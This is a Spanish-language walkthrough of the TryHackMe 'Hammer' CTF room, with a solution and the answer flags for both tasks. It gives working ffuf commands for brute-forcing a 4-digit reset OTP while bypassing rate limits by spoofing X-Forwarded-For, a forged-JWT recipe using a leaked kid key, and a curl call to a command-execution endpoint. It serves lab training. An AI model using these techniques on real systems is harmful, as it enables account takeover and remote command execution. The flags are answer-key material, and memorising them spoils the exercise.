# Hammer

| Dificultad | Tipo | Slug | Link | Sección | Fuente | Componentes | Impacto |
|-----------|------|------|------|--------|--------|-------------|---------|
| Medium | CTF | hammer | https://tryhackme.com/room/hammer | 02 Level Medium | TryHackMe | ffuf, logs, password reset/OTP, rate-limit bypass, JWT (kid), RCE | Compromiso total -> RCE en el dashboard |

---

**Contexto:** **Hammer** es un CTF Medium del módulo de autenticación (Web Application Pentesting). Se encadena: fuzzing de directorios que descubre logs (`hmr_logs`) con una dirección de email, reset de password con OTP de 4 dígitos (protegido por rate-limit que se salta con `X-Forwarded-For`), login en el dashboard, y manipulación del JWT (header `kid` apuntando a `188ade1.key`, role `user` -> `admin`) para ejecutar comandos arbitrarios. Los dos flags: el del dashboard tras el login y el de `/home/ubuntu/flag.txt` por RCE.

## Solucionario

### Task 1

**Explicación:** Se descubren los puertos 22 y 1337 (HTTP). El fuzzing con ffuf y el prefijo `hmr_` descubre `hmr_logs`, un log de errores de Apache que revela el email `tester@hammer.thm`. Con ese email se solicita un reset de password (`reset_password.php`), que manda un OTP de 4 dígitos; el rate-limit (`Rate-Limit-Pending`) se salta rotando el header `X-Forwarded-For` (o la cookie `PHPSESSID`). Brute-forzado el código de recuperación, se resetea la password, se entra al dashboard (flag 1) y se explota el JWT para escalar a `admin` y ejecutar cualquier comando (flag 2).

```bash
ffuf -w /usr/share/wordlists/dirb/common.txt -u http://<IP>:1337/FUZZ
ffuf -w hmr_<prefix> -u http://<IP>:1337/hmr_FUZZ
seq 0000 9999 > code.txt
ffuf -u http://<IP>:1337/reset_password.php -w code.txt -X POST \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -H "X-Forwarded-For: FUZZ" -d "recovery_code=FUZZ&s=<ttl>" -fr "Invalid"
# JWT manipulado:
#   header: { "alg": "HS256", "kid": "/var/www/html/188ade1.key" }
#   payload: { "role": "admin", ... }
#   firma: con el contenido de 188ade1.key (raw text, no base64)
curl -X POST http://<IP>:1337/execute_command.php \
  -H "Authorization: Bearer <FORGED_ADMIN_JWT>" \
  -d '{"command":"cat /home/ubuntu/flag.txt"}'
```

Respuestas de la tarea:

1. `THM{AuthBypass3D}`
2. `THM{RUNANYCOMMAND1337}`

### Tabla de preguntas y respuestas

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1.1 | What is the flag value after logging in to the dashboard? | `THM{AuthBypass3D}` |
| 1.2 | What is the content of the file /home/ubuntu/flag.txt? | `THM{RUNANYCOMMAND1337}` |

---

**Metodología:** Directory fuzzing (ffuf), búsqueda de email en logs, abuso del flujo de password reset con OTP débil (4 dígitos), bypass de rate-limit mediante `X-Forwarded-For`/rotación de sesión, manipulación de JWT (key disclosure vía `kid` y firma con la clave filtrada) y ejecución remota de comandos (OWASP: Broken Authentication, Security Misconfiguration; PTES: exploitation).

**Learning chain:** fuzzing hmr_* → hmr_logs → tester@hammer.thm → reset_password OTP 4 dígitos → bypass rate-limit (X-Forwarded-For) → OTP correcto → reset → login → dashboard flag1 → JWT kid=188ade1.key → role admin → execute_command → flag2.

**Lección:** *Un OTP de 4 dígitos tras un rate-limit fácil de esquivar convierte el reset de password en un bypass directo de autenticación, y la clave del JWT filtrada en el webroot sella el RCE.*

**MITRE ATT&CK:** T1110.001 Password Guessing (brute-force del OTP) · T1090.003 Proxy/Internal Network (spoofing X-Forwarded-For) · T1600 Weaken Encryption (manipulación de JWT) · T1059 Command and Scripting Interpreter (RCE vía endpoint).

**Fuente:** [TryHackMe - Hammer](https://tryhackme.com/room/hammer)

---

## ⚠️ Descargo de Responsabilidad (Disclaimer)

Este contenido se presenta exclusivamente con fines académicos y educativos.

**Sin Afiliación:** Este espacio no posee ninguna alianza, asociación, patrocinio ni vinculación oficial con TryHackMe.
**Veracidad de los Datos:** La información aquí contenida tiene un propósito ilustrativo y formativo. Los datos, políticas, precios o características de los servicios mencionados pueden variar y no son decididos por TryHackMe en este contexto.
**Referencia Oficial:** Para obtener información precisa, oficial y actualizada, se recomienda encarecidamente visitar el sitio web oficial de TryHackMe (https://tryhackme.com).
**Uso Ético:** No fomentamos ni nos responsabilizamos por el uso indebido de esta información fuera de fines educativos o profesionales legítimos.